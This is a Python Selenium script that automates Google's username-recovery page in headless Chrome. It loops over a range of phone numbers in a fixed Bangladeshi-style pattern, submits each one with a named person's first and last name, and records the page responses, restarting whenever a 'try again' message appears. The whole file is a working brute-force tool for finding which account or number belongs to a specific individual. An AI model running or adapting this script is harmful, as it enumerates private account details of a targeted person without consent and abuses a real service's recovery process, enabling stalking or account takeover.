from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
from bs4 import BeautifulSoup
import sys
from selenium.webdriver.chrome.options import Options

chrome_options = Options()
chrome_options.add_argument("--headless")  # Run Chrome in headless mode

driver = webdriver.Chrome(options=chrome_options)

url = "https://accounts.google.com/signin/v2/usernamerecovery"
fn = "J. N."
ln = "Nurim"
# Create a new instance of the Firefox WebDriver
#driver = webdriver.Firefox()

# Open the webpage
driver.get(url)
x = int(sys.argv[1])
y = int(sys.argv[2])
while x <= y:
     input_text = f"017{x:05d}022"
     time.sleep(1)
     #user_input = input("[press enter]....")
     try:
         # Find the input box and fill it with text        
           input_box = driver.find_element("id", "recoveryIdentifierId")
           input_box.send_keys(input_text)
           input_box.click()
           input_box.send_keys(Keys.ENTER)
           if input_box:
                x = x+1
                print (input_text)
           
     except:
        try:   
           input_box2 = driver.find_element("id", "firstName")
           input_box2.send_keys(fn)
           input_box3 = driver.find_element("id", "lastName")
           input_box3.send_keys(ln)
           input_box3.click()
           input_box3.send_keys(Keys.ENTER)
        except:
           full_page_html = driver.page_source
           soup = BeautifulSoup(full_page_html, 'html.parser')
           button_tags = soup.find_all('button')
           for button in button_tags:
                   print("Text:", button.text)
                   with open('example.txt', 'a') as file:
                            file.write(input_text)
                            file.write(button.text+'\n')       
                   if button.text == "আবার চেষ্টা করুন":
                            driver.get(url)
    
